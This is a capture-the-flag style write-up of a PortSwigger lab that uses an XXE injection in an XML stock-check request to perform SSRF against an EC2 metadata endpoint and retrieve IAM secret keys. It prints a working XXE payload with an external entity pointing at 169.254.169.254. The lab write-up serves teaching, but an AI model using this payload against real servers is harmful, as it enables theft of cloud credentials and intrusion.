# Exploiting XXE to perform SSRF attacks

## Introduction

Welcome to my another writeup! In this Portswigger Labs [lab](https://portswigger.net/web-security/xxe/lab-exploiting-xxe-to-perform-ssrf), you'll learn: Exploiting XXE to perform SSRF attacks! Without further ado, let's dive in.

- Overall difficulty for me (From 1-10 stars): ★☆☆☆☆☆☆☆☆☆

## Background

This lab has a "Check stock" feature that parses XML input and returns any unexpected values in the response.

The lab server is running a (simulated) EC2 metadata endpoint at the default URL, which is `http://169.254.169.254/`. This endpoint can be used to retrieve data about the instance, some of which might be sensitive.

To solve the lab, exploit the [XXE](https://portswigger.net/web-security/xxe) vulnerability to perform an [SSRF attack](https://portswigger.net/web-security/ssrf) that obtains the server's IAM secret access key from the EC2 metadata endpoint.

## Exploitation

**Home page:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/XXE-Injection/XXE-2/images/Pasted%20image%2020221225053702.png)

In the previous lab, we found that there is an **XXE injection vulnerability in the "Check stock" feature**, which parses XML input and **returns any unexpected values in the response**.

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/XXE-Injection/XXE-2/images/Pasted%20image%2020221225053748.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/XXE-Injection/XXE-2/images/Pasted%20image%2020221225053811.png)

**Original XML data:**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<stockCheck>
    <productId>1</productId>
    <storeId>1</storeId>
</stockCheck>
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/XXE-Injection/XXE-2/images/Pasted%20image%2020221225053821.png)

**Invalid XML data:**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<stockCheck>
    <productId>a</productId>
    <storeId>1</storeId>
</stockCheck>
```

**In XML, we can define an enternal entity and using keyword `SYSTEM` to make a request to any URL:**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [ <!ENTITY xxe SYSTEM "http://169.254.169.254/"> ]>
<stockCheck>
    <productId>&xxe;</productId>
    <storeId>1</storeId>
</stockCheck>
```

**Let's try to send that XXE payload:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/XXE-Injection/XXE-2/images/Pasted%20image%2020221225054445.png)

Hmm... `latest`?

**After looking at the [AWS's EC2 documentation](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/iam-roles-for-amazon-ec2.html), we can retrieve security credentials via:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/XXE-Injection/XXE-2/images/Pasted%20image%2020221225054631.png)

**Let's modify our payload's URL!**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/XXE-Injection/XXE-2/images/Pasted%20image%2020221225054652.png)

**Found IAM role `admin`. Let's append that to our URL:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/XXE-Injection/XXE-2/images/Pasted%20image%2020221225054743.png)

Boom! We found that!

# What we've learned:

1. Exploiting XXE to perform SSRF attacks